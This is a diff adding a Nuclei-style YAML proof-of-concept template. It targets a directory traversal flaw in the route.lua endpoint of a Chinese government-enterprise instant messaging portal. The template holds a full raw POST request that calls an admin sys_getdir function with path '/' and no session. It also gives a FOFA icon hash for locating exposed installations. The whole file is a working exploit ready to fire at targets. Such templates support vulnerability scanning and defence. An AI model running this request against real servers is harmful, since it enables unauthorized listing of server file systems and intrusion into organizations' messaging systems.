@@ -1,0 +1,40 @@
+id: poc-qd33ivkkpffq5izh
+info:
+  name: 政企即时通讯门户系统route存在目录遍历漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qd33ivkkpffq5izh'
+  tags: lfi,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qd33ivkkpffq5izh
+    fofa: icon_hash="561018561"
+http:
+- raw:
+  - 'POST /route.lua HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Cookie:
+
+    Authorization:
+
+    Accept: application/json, text/plain, */*
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: application/json;charset=utf-8
+
+    Content-Length: 126
+
+
+    {"data":"{\"modulename\":\"admin\",\"functionname\":\"sys_getdir\",\"path\":\"/\"}","sessionid":"","websocket_name":"k0tmucDU2TRvKh9f"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
